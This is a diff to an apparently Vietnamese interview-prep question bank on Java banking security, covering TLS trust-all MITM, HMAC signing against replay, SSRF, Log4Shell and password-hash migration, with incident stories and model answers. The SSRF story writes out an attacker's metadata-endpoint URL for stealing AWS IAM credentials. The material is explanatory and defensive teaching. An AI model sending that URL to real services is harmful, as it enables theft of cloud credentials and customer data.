+Microservice gọi partner API qua HTTPS nhưng trust-all TrustManager để "tránh lỗi cert". MITM proxy inject response, chuyển tiền sai tài khoản. Điều tra: code có {{TrustManager}} trả true; không verify hostname. Sửa: truststore chỉ chứa CA partner, enable hostname verification, TLS 1.3. Sau fix: handshake fail đúng khi cert sai; alert cert expiry 30 ngày. Kết quả: zero MITM finding.
+
+### Trả lời mẫu khi phỏng vấn
+"Ưu tiên TLS 1.3, chấp nhận TLS 1.2 với cipher ECDHE + AEAD; TLS 1.0/1.1 đã tắt mặc định trong JDK. Cert public thời hạn rút ngắn → tự động hoá gia hạn bằng ACME/cert-manager. Truststore chỉ chứa CA cần thiết. Spring Boot mTLS set {{server.ssl.client-auth=need}}. Test handshake bằng openssl s_client. Không tắt hostname verification; PKIX path building failed thì soi chain bằng openssl -showcerts thay vì thêm bừa cert."
 
 > Senior tip: **Ưu tiên TLS 1.3, chấp nhận TLS 1.2** với cipher ECDHE + AEAD; TLS 1.0/1.1 đã bị JDK tắt mặc định (security property {{jdk.tls.disabledAlgorithms}} trong {{java.security}}). Thời hạn cert public đang bị CA/B Forum rút ngắn dần (ballot SC-081: 200 ngày từ 3/2026, tiến tới 47 ngày năm 2029) → bắt buộc tự động hoá gia hạn (ACME, cert-manager). Truststore chỉ chứa CA cần thiết — ít hơn = bề mặt tấn công nhỏ hơn. Spring Boot: {{server.ssl.client-auth=need}} cho mTLS. Test handshake: {{openssl s_client -connect api.bank.com:443 -servername api.bank.com -cert client.crt -key client.key}}.`,
   follow: [
@@ -987,6 +1071,12 @@ public boolean verify(String payload, String timestamp, String nonce, String sig
 | Performance | Rất nhanh | Chậm hơn (đặc biệt bước ký RSA; ECDSA/Ed25519 nhanh hơn RSA khi ký) |
 | Key distribution | Khó (cần secure channel) | Dễ (public key public) |
 | Use case | Internal microservices, high QPS | Partner API, banking transaction, audit trail |
+
+### Ví dụ đời thực
+Giao dịch chuyển tiền chỉ kiểm tra session cookie, không chữ ký. Attacker replay request với cookie bị đánh cắp chuyển tiền lần hai. Điều tra: không có nonce/timestamp, không verify signature. Sửa: HMAC-SHA256 trên payload canonicalized + timestamp + nonce; server verify và lưu nonce 5 phút. Sau fix: replay bị từ chối, audit non-repudiation đạt yêu cầu pháp lý.
+
+### Trả lời mẫu khi phỏng vấn
+"Ngân hàng thường yêu cầu digital signature cho giao dịch chuyển tiền, mở tài khoản — non-repudiation thường là yêu cầu pháp lý. Internal service dùng HMAC cho performance. Luôn canonicalize payload (sorted keys, no whitespace) trước khi sign. Key rotation: HMAC secret 90 ngày, signing cert 1-2 năm. Log verify failed. Chọn RS256+JWKS cho token; HMAC cho service-to-service nội bộ."
 
 > Senior tip: **Ngân hàng thường yêu cầu digital signature** cho giao dịch chuyển tiền, mở tài khoản — non-repudiation thường là yêu cầu pháp lý/hợp đồng với đối tác. Internal service dùng HMAC cho performance. Luôn canonicalize payload (sorted keys, no whitespace) trước khi sign. Key rotation: HMAC secret rotate 90 ngày, signing cert rotate 1-2 năm. Log tất cả verify failed (potential attack).`,
   follow: [
@@ -1097,6 +1187,12 @@ mapper.activateDefaultTyping(ptv, ObjectMapper.DefaultTyping.NON_FINAL);
 - **SAML/XML** parsing không disable external entity → XXE.
 - **Java serialization** trong Redis session / RMI → deserialization RCE.
 - **Log4Shell** (CVE-2021-44228) — bản chất là **JNDI injection**: lookup trong log message khiến app kết nối LDAP/RMI của attacker, nhận về class/object độc → RCE.
+
+### Ví dụ đời thực
+Endpoint "preview URL" nhận URL từ user và fetch để tạo thumbnail. Attacker gửi {{http://169.254.169.254/latest/meta-data/iam/security-credentials/}} → lấy AWS credentials → truy cập S3 chứa dữ liệu khách hàng. Điều tra: code dùng {{RestTemplate.getForObject(url)}} không validate; IMDSv1 cho phép. Sửa: allowlist host+scheme, resolve IP và chặn dải private/link-local, tắt follow redirect; IMDSv2 + network policy. Sau fix: request tới metadata bị 400, pentest không reproduce.
+
+### Trả lời mẫu khi phỏng vấn
+"Mặc định deny all outbound — chỉ whitelist domain/IP partner. Dùng egress proxy enforce policy. XML parser set disallow-doctype-decl=true ngay khi init. Deserialization dùng ObjectInputFilter, tốt nhất không deserialize Java native từ nguồn không tin cậy. Log4Shell: upgrade Log4j 2.17.1+. Blocklist IP dễ bypass bằng encoding/DNS; đảo tư duy sang allowlist. SSRF là một dòng fetch URL nhưng hậu quả có thể mất toàn bộ cloud account."
 
 > Senior tip: **Mặc định deny all outbound** — chỉ whitelist domain/IP partner. Dùng egress proxy (Envoy, Squid) enforce policy. XML parser: set feature {{disallow-doctype-decl=true}} ngay khi init. Deserialization: {{ObjectInputFilter}} (JEP 290; Java 17 có thêm filter factory theo context — JEP 415), tốt nhất là không deserialize Java native từ nguồn không tin cậy. Log4Shell: upgrade Log4j 2.17.1+ (Java 8) — từ 2.16.0 JNDI bị tắt mặc định và message lookup bị gỡ; {{log4j2.formatMsgNoLookups=true}} chỉ là biện pháp tạm và **không đủ** (bị bypass, CVE-2021-45046).`,
   follow: [
@@ -2207,7 +2303,7 @@ Tháng 3/2024, backdoor trong **xz-utils** (CVE-2024-3094) được phát hiện
   id: 'security-029',
   topic: 'security',
   level: 'mid',
-  q: 'Lưu mật khẩu user: bcrypt/argon2, pepper, và migrate hash cũ (MD5/SHA1) sang hash mạnh mà không bắt user đổi mật khẩu?',
+  q: 'Lưu mật khẩu user: bcrypt/argon2, pepper, và migrate hash cũ (MD5/SHA1/SHA-256/SHA-512) sang hash mạnh mà không bắt user đổi mật khẩu?',
   a: `**Tóm tắt:** Dùng Argon2id (hoặc bcrypt) với salt tự động; thêm pepper bí mật ở app; migrate hash cũ bằng cách re-hash khi user login thành công, transparent.
 
 ### Vì sao không dùng MD5/SHA1/SHA256
